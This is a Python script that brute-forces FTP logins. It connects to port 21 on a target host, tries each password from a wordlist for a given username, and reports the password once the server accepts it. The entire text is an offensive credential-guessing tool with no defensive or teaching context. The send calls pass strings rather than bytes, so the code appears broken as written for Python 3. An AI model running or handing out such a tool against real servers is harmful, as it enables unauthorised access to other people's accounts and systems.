import sys
import os
import re
import time
import socket

if (len(sys.argv) != 4):
    print("Usage: python main.py host username wordlist")
    sys.exit(1)

server = sys.argv[1]
username = sys.argv[2]
wordlist = sys.argv[3]

file = open(f"{wordlist}.txt")

start = time.time()  # Track the start time

for key in file.readlines():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, 21))
    s.recv(1024)
    s.send("USER " + username + "\r\n")
    s.recv(1024)
    s.send("PASS " + key.strip() + "\r\n")
    result = s.recv(1024)
    s.send("QUIT\r\n")
    if re.search("230", result.decode('utf-8')):
        print("<==================================>")
        print("\033[32mBrute force done!\033[0m")
        print("<==================================>")
        print(f"Password found: {key.strip()}")
        print(f"Username: {username}")
        print(f"Server: {server}")
        print("<==================================>")
        print("Ftp cracked in " + str(time.time() - start) + " seconds")
        print("\033[32mExiting...\033[0m")
        break
    else:
        print(f"{time.strftime('%d/%m/%y %H:%M:%S')} \033[31mFailed\033[0m to login with user: {username} and password: {key.strip()}")